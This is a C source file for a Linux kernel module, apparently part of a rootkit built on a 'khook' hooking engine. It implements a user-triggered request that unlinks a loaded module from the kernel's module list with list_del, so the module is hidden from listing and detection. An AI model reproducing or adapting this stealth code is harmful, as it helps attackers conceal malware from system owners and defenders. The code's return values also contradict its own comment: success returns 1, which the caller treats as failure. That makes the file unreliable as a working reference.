#include "../khook/engine.h"
#include "../protocol.h"
#include "driver_hiding.h"

#include <linux/init.h>
#include <linux/module.h> //module
#include <linux/kernel.h> //module
#include <linux/uaccess.h> // copy_from_user





// return zero if success
static int hide_driver(unsigned int rank) {
    unsigned int i;
    struct module *cur_ptr = NULL;
    cur_ptr = THIS_MODULE;
    // //find the head of list(first module)
    // while ((&cur_ptr->list)->prev != NULL){
    //     cur_ptr = list_entry( (&cur_ptr->list)->prev, struct module, list);
    // }
    //get module on rank 
    
    for (i=0;i<rank;i++){
        if (list_entry( (&cur_ptr->list)->next, struct module, list) != NULL)
            cur_ptr = list_entry( (&cur_ptr->list)->next, struct module, list);
        else
            goto err;
    }
    list_del(&cur_ptr->list);
    return 1;

    err:
    return 0;
}

int handle_driver_hiding_request(void *raw_subargs) {
    struct DriverHidingSubargs subargs;
    if (copy_from_user(&subargs, (void *)raw_subargs, sizeof(struct DriverHidingSubargs)) != 0) {
        // copy failed
        goto err;
    }
    if (hide_driver(subargs.rank) != 0) {
        // process hide failed
        goto err;
    }
    return 0;

    err:
    return 1;
}

